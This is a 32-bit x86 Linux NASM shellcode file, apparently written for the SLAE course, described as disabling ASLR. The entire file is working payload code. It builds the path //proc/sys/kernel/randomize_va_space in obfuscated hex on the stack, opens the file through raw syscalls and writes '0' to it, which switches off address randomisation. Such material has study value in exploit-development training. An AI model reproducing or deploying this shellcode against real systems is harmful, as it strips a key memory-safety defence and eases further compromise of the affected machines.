; poly_aslr.nasm
; 
; Desc: this shellcode disables ASLR 
;
; Author: Xenofon Vassilakopoulos 
; 
; Student ID: SLAE - 1314

global _start

section .text

_start:
        xor    ebx,ebx
        mul    ebx
        mov    DWORD [esp-0x4],eax
        mov    DWORD [esp-0x8],0x65636170
        mov    DWORD [esp-0xc],0x735f6176
        mov    DWORD [esp-0x10],0x5f657a69
        mov    DWORD [esp-0x14],0x6d6f646e
        mov    DWORD [esp-0x18],0x61722f6c
        mov    DWORD [esp-0x1c],0x656e7265
        mov    DWORD [esp-0x20],0x6b2f7379
        mov    DWORD [esp-0x24],0x732f636f
        mov    DWORD [esp-0x28],0x72702f2f
        sub    esp,0x28
        mov    ebx,esp
        mov    cx,0x301
        mov    dx,0x2a1
        add    dx,0x1b
        mov    al, 0x5
        int    0x80
        mov    ebx,eax
        push   ebx
        mov    cx,0x3b30
        push   cx
        mov    ecx,esp
        shr    edx, 16
        inc    edx
        mov    al,0x4
        int    0x80
	xor    eax, eax 
        inc    al
        int    0x80
